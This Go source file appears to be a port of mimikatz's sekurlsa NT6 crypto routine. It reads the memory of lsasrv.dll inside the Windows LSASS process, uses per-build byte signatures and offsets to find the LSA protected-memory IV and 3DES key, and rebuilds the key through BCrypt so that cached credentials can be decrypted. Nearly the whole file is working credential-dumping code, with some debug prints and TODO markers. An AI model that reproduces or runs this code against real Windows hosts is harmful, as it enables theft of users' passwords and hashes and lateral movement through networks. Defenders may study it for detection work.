package kiwi

import (
	"bytes"
	"fmt"
	"runtime"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/module/windows/api"
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

var (
	patternWin7X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D,
	}
	patternWin8X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D,
	}
	patternWin10X64LSAInitProtectedMemoryKey = []byte{
		0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D, 0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15,
	}

	lsaInitProtectedMemoryKeyReferencesX64 = []*patchGeneric{
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin7X64LSAInitProtectedMemoryKey),
				data:   patternWin7X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 63, off1: -69, off2: 25},
		},
		{
			minBuild: buildWin7,
			search: &patchPattern{
				length: len(patternWin7X64LSAInitProtectedMemoryKey),
				data:   patternWin7X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 59, off1: -61, off2: 25},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWin8X64LSAInitProtectedMemoryKey),
				data:   patternWin8X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 62, off1: -70, off2: 13},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWin10X64LSAInitProtectedMemoryKey),
				data:   patternWin10X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 61, off1: -73, off2: 16},
		},
		{
			minBuild: buildWin10v1809,
			search: &patchPattern{
				length: len(patternWin10X64LSAInitProtectedMemoryKey),
				data:   patternWin10X64LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 67, off1: -89, off2: 16},
		},
	}
)

var (
	patternWinAllX86LSAInitProtectedMemoryKey = []byte{0x6A, 0x02, 0x6A, 0x10, 0x68}

	lsaInitProtectedMemoryKeyReferencesX86 = []*patchGeneric{
		{
			minBuild: buildWin7,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -76, off2: -21},
		},
		{
			minBuild: buildWin8,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -69, off2: -18},
		},
		{
			minBuild: buildWinBlue,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
		},
		{
			minBuild: buildWin10v1507,
			search: &patchPattern{
				length: len(patternWinAllX86LSAInitProtectedMemoryKey),
				data:   patternWinAllX86LSAInitProtectedMemoryKey,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: 5, off1: -79, off2: -22},
		},
	}
)

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h

type bcryptHandleKey struct {
	size     uint32
	tag      uint32  // U U U R
	hAlg     uintptr // algorithm handle
	key      uintptr // bcryptKey
	unknown0 uintptr
}

type bcryptKey80 struct {
	size     uint32
	tag      uint32 // M S S K
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	unknown3 uint32
	unknown4 uint32
	hardKey  hardKey
}

type bcryptKey81 struct {
	size     uint32
	tag      uint32 // M S S K
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	unknown3 uint32
	unknown4 uint32
	unknown5 uintptr // before, align in x64
	unknown6 uint32
	unknown7 uint32
	unknown8 uint32
	unknown9 uint32
	hardKey  hardKey
}

type hardKey struct {
	secret uint32
	data   [4]byte // self append, not used
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
	lsasrv, err := kiwi.getLSASSBasicModuleInfo(pHandle, "lsasrv.dll")
	if err != nil {
		return err
	}
	memory := make([]byte, lsasrv.size)
	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], uintptr(lsasrv.size))
	if err != nil {
		return errors.WithMessage(err, "failed to search memory")
	}
	var patches []*patchGeneric
	switch runtime.GOARCH {
	case "386":
		patches = lsaInitProtectedMemoryKeyReferencesX86
	case "amd64":
		patches = lsaInitProtectedMemoryKeyReferencesX64
	}
	_, _, build := kiwi.getWindowsVersion()
	patch := selectGenericPatch(patches, build)

	fmt.Println(patch.minBuild)

	index := bytes.Index(memory, patch.search.data)

	address2 := lsasrv.address + uintptr(index+patch.offsets.off0)

	var offset2 uint32
	_, err = api.ReadProcessMemory(pHandle, address2, (*byte)(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
	if err != nil {
		return errors.WithMessage(err, "failed to read iv")
	}

	address2 += 4 + uintptr(offset2)

	iv := make([]byte, 16)
	_, err = api.ReadProcessMemory(pHandle, address2, &iv[0], uintptr(16))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	kiwi.iv = iv
	fmt.Println("IV:", iv)

	address3 := lsasrv.address + uintptr(index+patch.offsets.off1) // TODO off1

	kiwi.nt6RequireKey(pHandle, address3)
	// address3 = lsasrv.address + uintptr(index) + 16 // TODO off2
	// kiwi.nt6RequireKey(pHandle, address3)

	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
	return nil
}

func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error {
	var offset3 int32
	_, err := api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Println(convert.LEInt32ToBytes(offset3))

	address3 += 4 + uintptr(offset3)
	var bhkAddr uintptr
	_, err = api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&bhkAddr)), unsafe.Sizeof(bhkAddr))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Printf("8, %X\n", bhkAddr)

	var bhk bcryptHandleKey
	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhk)), unsafe.Sizeof(bhk))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println(bhk)

	var bk81 bcryptKey81
	_, err = api.ReadProcessMemory(pHandle, bhk.key, (*byte)(unsafe.Pointer(&bk81)), unsafe.Sizeof(bk81))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println(bk81)

	hardKeyData := make([]byte, int(bk81.hardKey.secret))
	addr1 := bhk.key + unsafe.Offsetof(bcryptKey81{}.hardKey) + unsafe.Offsetof(hardKey{}.data)
	_, err = api.ReadProcessMemory(pHandle, addr1, &hardKeyData[0], uintptr(len(hardKeyData)))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println("hard key data:", hardKeyData)

	fmt.Println(bhk.size)
	fmt.Println(bk81.size)

	algHandle, err := api.BCryptOpenAlgorithmProvider("3DES", "", 0)
	if err != nil {
		return errors.WithMessage(err, "failed to open bcrypt handle key")
	}

	prop := "ChainingMode"
	mode := windows.StringToUTF16("ChainingModeCBC")
	err = api.BCryptSetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&mode[0])), uint32(len(mode)), 0)
	if err != nil {
		return errors.WithMessage(err, "failed to set bcrypt handle key")
	}
	prop = "ObjectLength"
	var length uint32
	_, err = api.BCryptGetProperty(algHandle, prop, (*byte)(unsafe.Pointer(&length)), 4, 0)
	if err != nil {
		return errors.WithMessage(err, "failed to set bcrypt handle key")
	}
	bk := api.BcryptKey{
		Provider: algHandle,
		Object:   make([]byte, length),
		Secret:   hardKeyData,
	}
	err = api.BCryptGenerateSymmetricKey(&bk)
	if err != nil {
		return err
	}
	kiwi.key3DES = &bk

	return nil
}
